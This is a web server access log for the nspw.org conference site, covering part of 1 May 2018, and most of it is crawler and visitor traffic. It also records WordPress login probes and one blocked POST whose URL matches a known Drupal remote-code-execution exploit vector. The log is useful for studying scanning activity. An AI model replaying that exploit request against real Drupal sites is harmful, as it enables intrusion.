66.249.73.87 - - [01/May/2018:15:32:40 -0400] "GET /papers/2012/docs/p67.pdf HTTP/1.1" 200 658369 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
66.249.73.87 - - [01/May/2018:15:33:05 -0400] "GET /current/oc.shtml HTTP/1.1" 404 8006 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
77.88.47.40 - - [01/May/2018:15:33:36 -0400] "GET /papers/2001/?C=M;O=A HTTP/1.1" 200 4413 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [01/May/2018:15:33:38 -0400] "GET /node/54 HTTP/1.1" 200 3403 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [01/May/2018:15:33:41 -0400] "GET /2007/program.shtml HTTP/1.1" 200 3164 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
216.244.66.236 - - [01/May/2018:15:33:45 -0400] "GET /robots.txt HTTP/1.1" 200 5796 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
77.88.47.40 - - [01/May/2018:15:33:51 -0400] "GET /2005/past.content HTTP/1.1" 200 5387 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [01/May/2018:15:34:44 -0400] "GET /1999/program_print.html HTTP/1.1" 200 5469 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
88.124.154.180 - - [01/May/2018:15:34:51 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
88.124.154.180 - - [01/May/2018:15:34:52 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
77.88.47.40 - - [01/May/2018:15:34:55 -0400] "GET /registration HTTP/1.1" 200 6741 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [01/May/2018:15:35:00 -0400] "GET /2002/cfp.shtml HTTP/1.1" 200 2947 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
197.237.35.14 - - [01/May/2018:15:35:16 -0400] "GET /favicon.ico HTTP/1.1" 404 4109 "https://www.nspw.org/papers/1997/nspw1997-meadows.pdf" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36"
197.237.35.14 - - [01/May/2018:15:35:16 -0400] "GET /papers/1997/nspw1997-meadows.pdf HTTP/1.1" 200 431956 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36"
69.162.124.227 - - [01/May/2018:15:35:34 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.87 - - [01/May/2018:15:37:19 -0400] "GET /2017 HTTP/1.1" 200 7054 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
197.206.210.42 - - [01/May/2018:15:37:43 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
197.206.210.42 - - [01/May/2018:15:37:44 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
138.36.229.19 - - [01/May/2018:15:38:29 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
138.36.229.19 - - [01/May/2018:15:38:31 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
90.64.95.241 - - [01/May/2018:15:38:33 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
90.64.95.241 - - [01/May/2018:15:38:34 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
180.76.15.31 - - [01/May/2018:15:38:38 -0400] "GET /2015/organizers HTTP/1.1" 200 14462 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
66.249.73.91 - - [01/May/2018:15:40:05 -0400] "GET /current/pc.shtml HTTP/1.1" 404 8006 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
157.55.39.242 - - [01/May/2018:15:40:16 -0400] "GET /2017/program HTTP/1.1" 200 7814 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
69.162.124.227 - - [01/May/2018:15:40:34 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
73.209.71.29 - - [01/May/2018:15:43:30 -0400] "GET /papers/2008/nspw2008-beautement.pdf HTTP/1.1" 200 769415 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
73.209.71.29 - - [01/May/2018:15:43:31 -0400] "GET /favicon.ico HTTP/1.1" 404 700 "https://www.nspw.org/papers/2008/nspw2008-beautement.pdf" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
73.209.71.29 - - [01/May/2018:15:43:50 -0400] "-" 408 3408 "-" "-"
69.162.124.227 - - [01/May/2018:15:45:34 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.89 - - [01/May/2018:15:45:42 -0400] "GET /papers/2010/nspw2010-bratus.pdf HTTP/1.1" 200 457254 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
201.15.185.57 - - [01/May/2018:15:47:34 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
201.15.185.57 - - [01/May/2018:15:47:35 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
77.88.47.40 - - [01/May/2018:15:49:06 -0400] "GET /papers/1999/?C=S;O=D HTTP/1.1" 200 4388 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
69.162.124.227 - - [01/May/2018:15:50:34 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
79.117.206.209 - - [01/May/2018:15:50:41 -0400] "POST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1" 403 9125 "-" "Ruby"
123.125.143.31 - - [01/May/2018:15:51:49 -0400] "GET / HTTP/1.1" 200 6635 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
123.125.143.31 - - [01/May/2018:15:51:49 -0400] "GET /modules/system/system.base.css?p7r9uw HTTP/1.1" 200 2307 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
123.125.143.31 - - [01/May/2018:15:51:49 -0400] "GET /modules/system/system.menus.css?p7r9uw HTTP/1.1" 200 1025 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
123.125.143.159 - - [01/May/2018:15:51:49 -0400] "GET /modules/system/system.messages.css?p7r9uw HTTP/1.1" 200 884 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
123.125.143.31 - - [01/May/2018:15:51:49 -0400] "GET /modules/system/system.theme.css?p7r9uw HTTP/1.1" 200 1585 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
123.125.143.31 - - [01/May/2018:15:51:49 -0400] "GET /modules/comment/comment.css?p7r9uw HTTP/1.1" 200 643 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
123.125.143.157 - - [01/May/2018:15:51:50 -0400] "GET /modules/field/theme/field.css?p7r9uw HTTP/1.1" 200 737 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
123.125.143.29 - - [01/May/2018:15:51:50 -0400] "GET /modules/node/node.css?p7r9uw HTTP/1.1" 200 610 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
123.125.143.29 - - [01/May/2018:15:51:50 -0400] "GET /modules/user/user.css?p7r9uw HTTP/1.1" 200 1200 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
123.125.143.159 - - [01/May/2018:15:51:50 -0400] "GET /themes/garland/style.css?p7r9uw HTTP/1.1" 200 5370 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
123.125.143.31 - - [01/May/2018:15:51:50 -0400] "GET /themes/garland/print.css?p7r9uw HTTP/1.1" 200 771 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
123.125.143.31 - - [01/May/2018:15:51:50 -0400] "GET /misc/jquery.js?v=1.4.4 HTTP/1.1" 200 27601 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
123.125.143.157 - - [01/May/2018:15:51:50 -0400] "GET /misc/jquery.once.js?v=1.2 HTTP/1.1" 200 1445 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
123.125.143.29 - - [01/May/2018:15:51:50 -0400] "GET /misc/drupal.js?p7r9uw HTTP/1.1" 200 7372 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
123.125.143.20 - - [01/May/2018:15:53:10 -0400] "GET /modules/system/system.base.css?p7r9uw HTTP/1.1" 200 9624 "-" "Python-urllib/2.7"
123.125.143.20 - - [01/May/2018:15:53:12 -0400] "GET /modules/comment/comment.css?p7r9uw HTTP/1.1" 200 4339 "-" "Python-urllib/2.7"
123.125.143.135 - - [01/May/2018:15:53:13 -0400] "GET /themes/garland/style.css?p7r9uw HTTP/1.1" 200 25021 "-" "Python-urllib/2.7"
123.125.143.17 - - [01/May/2018:15:53:14 -0400] "GET /themes/garland/print.css?p7r9uw HTTP/1.1" 200 5203 "-" "Python-urllib/2.7"
123.125.143.146 - - [01/May/2018:15:53:17 -0400] "GET /sites/default/files/nspw-logo-smaller.jpg HTTP/1.1" 200 6165 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
123.125.143.146 - - [01/May/2018:15:53:18 -0400] "GET /themes/garland/images/bg-navigation-item-hover.png HTTP/1.1" 200 709 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
123.125.143.146 - - [01/May/2018:15:53:20 -0400] "GET /themes/garland/images/bg-navigation-item.png HTTP/1.1" 200 757 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
123.125.143.146 - - [01/May/2018:15:53:21 -0400] "GET /themes/garland/images/menu-leaf.gif HTTP/1.1" 200 437 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
123.125.143.146 - - [01/May/2018:15:53:22 -0400] "GET /themes/garland/images/menu-expanded.gif HTTP/1.1" 200 437 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
123.125.143.146 - - [01/May/2018:15:53:23 -0400] "GET /themes/garland/images/menu-collapsed.gif HTTP/1.1" 200 437 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
132.205.229.216 - - [01/May/2018:15:53:39 -0400] "GET /2017/cfp HTTP/1.1" 200 8807 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15"
132.205.229.216 - - [01/May/2018:15:53:39 -0400] "GET /modules/system/system.base.css?p7r9uw HTTP/1.1" 200 2307 "https://www.nspw.org/2017/cfp" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15"
132.205.229.216 - - [01/May/2018:15:53:39 -0400] "GET /modules/node/node.css?p7r9uw HTTP/1.1" 200 472 "https://www.nspw.org/2017/cfp" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15"
132.205.229.216 - - [01/May/2018:15:53:39 -0400] "GET /modules/user/user.css?p7r9uw HTTP/1.1" 200 1062 "https://www.nspw.org/2017/cfp" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15"
132.205.229.216 - - [01/May/2018:15:53:39 -0400] "GET /modules/comment/comment.css?p7r9uw HTTP/1.1" 200 647 "https://www.nspw.org/2017/cfp" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15"
132.205.229.216 - - [01/May/2018:15:53:39 -0400] "GET /themes/garland/style.css?p7r9uw HTTP/1.1" 200 5370 "https://www.nspw.org/2017/cfp" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15"
132.205.229.216 - - [01/May/2018:15:53:39 -0400] "GET /themes/garland/print.css?p7r9uw HTTP/1.1" 200 771 "https://www.nspw.org/2017/cfp" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15"
132.205.229.216 - - [01/May/2018:15:53:39 -0400] "GET /modules/system/system.menus.css?p7r9uw HTTP/1.1" 200 1167 "https://www.nspw.org/2017/cfp" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15"
132.205.229.216 - - [01/May/2018:15:53:39 -0400] "GET /modules/system/system.messages.css?p7r9uw HTTP/1.1" 200 888 "https://www.nspw.org/2017/cfp" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15"
132.205.229.216 - - [01/May/2018:15:53:39 -0400] "GET /modules/field/theme/field.css?p7r9uw HTTP/1.1" 200 741 "https://www.nspw.org/2017/cfp" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15"
132.205.229.216 - - [01/May/2018:15:53:39 -0400] "GET /modules/system/system.theme.css?p7r9uw HTTP/1.1" 200 1727 "https://www.nspw.org/2017/cfp" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15"
132.205.229.216 - - [01/May/2018:15:53:39 -0400] "GET /sites/default/files/nspw-logo-smaller.jpg HTTP/1.1" 200 2534 "https://www.nspw.org/2017/cfp" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15"
132.205.229.216 - - [01/May/2018:15:53:39 -0400] "GET /misc/drupal.js?p7r9uw HTTP/1.1" 200 7372 "https://www.nspw.org/2017/cfp" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15"
132.205.229.216 - - [01/May/2018:15:53:39 -0400] "GET /misc/jquery.once.js?v=1.2 HTTP/1.1" 200 1445 "https://www.nspw.org/2017/cfp" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15"
132.205.229.216 - - [01/May/2018:15:53:39 -0400] "GET /misc/jquery.js?v=1.4.4 HTTP/1.1" 200 27601 "https://www.nspw.org/2017/cfp" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15"
132.205.229.216 - - [01/May/2018:15:53:39 -0400] "GET /themes/garland/images/bg-content.png HTTP/1.1" 200 798 "https://www.nspw.org/2017/cfp" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15"
132.205.229.216 - - [01/May/2018:15:53:39 -0400] "GET /themes/garland/images/menu-leaf.gif HTTP/1.1" 200 486 "https://www.nspw.org/2017/cfp" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15"
132.205.229.216 - - [01/May/2018:15:53:39 -0400] "GET /themes/garland/images/menu-collapsed.gif HTTP/1.1" 200 488 "https://www.nspw.org/2017/cfp" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15"
132.205.229.216 - - [01/May/2018:15:53:39 -0400] "GET /themes/garland/images/menu-expanded.gif HTTP/1.1" 200 495 "https://www.nspw.org/2017/cfp" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15"
132.205.229.216 - - [01/May/2018:15:53:39 -0400] "GET /themes/garland/images/bg-navigation-item.png HTTP/1.1" 200 812 "https://www.nspw.org/2017/cfp" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15"
132.205.229.216 - - [01/May/2018:15:53:39 -0400] "GET /themes/garland/images/body.png HTTP/1.1" 200 993 "https://www.nspw.org/2017/cfp" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15"
132.205.229.216 - - [01/May/2018:15:53:39 -0400] "GET /themes/garland/images/bg-content-right.png HTTP/1.1" 200 3162 "https://www.nspw.org/2017/cfp" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15"
132.205.229.216 - - [01/May/2018:15:53:39 -0400] "GET /themes/garland/images/bg-content-left.png HTTP/1.1" 200 3232 "https://www.nspw.org/2017/cfp" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15"
132.205.229.216 - - [01/May/2018:15:53:39 -0400] "GET /favicon.ico HTTP/1.1" 404 3914 "https://www.nspw.org/2017/cfp" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15"
132.205.229.216 - - [01/May/2018:15:53:46 -0400] "GET /2018 HTTP/1.1" 200 3652 "https://www.nspw.org/2017/cfp" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15"
132.205.229.216 - - [01/May/2018:15:53:46 -0400] "GET /themes/garland/images/bg-navigation-item-hover.png HTTP/1.1" 200 754 "https://www.nspw.org/2018" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15"
132.205.229.216 - - [01/May/2018:15:53:51 -0400] "GET /2018/cfp HTTP/1.1" 200 4896 "https://www.nspw.org/2018" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15"
78.187.65.29 - - [01/May/2018:15:53:52 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
78.187.65.29 - - [01/May/2018:15:53:54 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
132.205.229.216 - - [01/May/2018:15:53:56 -0400] "GET /2018/dates HTTP/1.1" 200 3021 "https://www.nspw.org/2018/cfp" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15"
66.249.73.91 - - [01/May/2018:15:54:04 -0400] "GET /2006/dates.shtml HTTP/1.1" 200 4949 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
132.205.229.216 - - [01/May/2018:15:54:10 -0400] "GET /2017/cfp HTTP/1.1" 200 5751 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15"
69.162.124.227 - - [01/May/2018:15:55:34 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
14.215.176.4 - - [01/May/2018:15:55:49 -0400] "GET / HTTP/1.1" 200 6633 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
14.215.176.4 - - [01/May/2018:15:55:49 -0400] "GET /modules/system/system.base.css?p7r9uw HTTP/1.1" 200 2307 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
14.215.176.4 - - [01/May/2018:15:55:49 -0400] "GET /modules/system/system.menus.css?p7r9uw HTTP/1.1" 200 1025 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
14.215.176.9 - - [01/May/2018:15:55:50 -0400] "GET /modules/system/system.messages.css?p7r9uw HTTP/1.1" 200 884 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
14.215.176.11 - - [01/May/2018:15:55:50 -0400] "GET /modules/comment/comment.css?p7r9uw HTTP/1.1" 200 643 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
14.215.176.4 - - [01/May/2018:15:55:50 -0400] "GET /modules/system/system.theme.css?p7r9uw HTTP/1.1" 200 1585 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
14.215.176.10 - - [01/May/2018:15:55:50 -0400] "GET /modules/field/theme/field.css?p7r9uw HTTP/1.1" 200 737 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
14.215.176.8 - - [01/May/2018:15:55:50 -0400] "GET /modules/node/node.css?p7r9uw HTTP/1.1" 200 610 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
14.215.176.7 - - [01/May/2018:15:55:50 -0400] "GET /modules/user/user.css?p7r9uw HTTP/1.1" 200 1200 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
14.215.176.9 - - [01/May/2018:15:55:50 -0400] "GET /themes/garland/style.css?p7r9uw HTTP/1.1" 200 5370 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
14.215.176.4 - - [01/May/2018:15:55:50 -0400] "GET /themes/garland/print.css?p7r9uw HTTP/1.1" 200 771 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
14.215.176.10 - - [01/May/2018:15:55:50 -0400] "GET /misc/jquery.once.js?v=1.2 HTTP/1.1" 200 1445 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
14.215.176.11 - - [01/May/2018:15:55:50 -0400] "GET /misc/jquery.js?v=1.4.4 HTTP/1.1" 200 27601 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
14.215.176.8 - - [01/May/2018:15:55:50 -0400] "GET /misc/drupal.js?p7r9uw HTTP/1.1" 200 7372 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
180.76.15.155 - - [01/May/2018:15:56:21 -0400] "GET /modules/user/user.css?p7r9uw HTTP/1.1" 200 5559 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
39.53.16.254 - - [01/May/2018:15:57:23 -0400] "GET /wp-login.php HTTP/1.1" 404 7903 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
39.53.16.254 - - [01/May/2018:15:57:26 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
180.76.15.152 - - [01/May/2018:15:58:21 -0400] "GET /papers/2010/nspw2010-moore.pdf HTTP/1.1" 200 741132 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
216.244.66.236 - - [01/May/2018:15:58:25 -0400] "GET /robots.txt HTTP/1.1" 200 5796 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
137.112.228.195 - - [01/May/2018:15:58:43 -0400] "GET /papers/2007/nspw2007-mannan.pdf HTTP/1.1" 200 502385 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0 Mobile/15D60 Safari/604.1"
137.112.228.195 - - [01/May/2018:15:58:44 -0400] "GET /apple-touch-icon-120x120-precomposed.png HTTP/1.1" 404 3943 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
137.112.228.195 - - [01/May/2018:15:58:44 -0400] "GET /apple-touch-icon-120x120.png HTTP/1.1" 404 717 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
137.112.228.195 - - [01/May/2018:15:58:45 -0400] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 721 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
137.112.228.195 - - [01/May/2018:15:58:45 -0400] "GET /apple-touch-icon.png HTTP/1.1" 404 709 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
137.112.228.195 - - [01/May/2018:15:58:45 -0400] "GET /favicon.ico HTTP/1.1" 404 700 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
137.112.228.195 - - [01/May/2018:15:58:45 -0400] "GET /apple-touch-icon-120x120-precomposed.png HTTP/1.1" 404 729 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
137.112.228.195 - - [01/May/2018:15:58:45 -0400] "GET /apple-touch-icon-120x120.png HTTP/1.1" 404 717 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
137.112.228.195 - - [01/May/2018:15:58:45 -0400] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 721 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
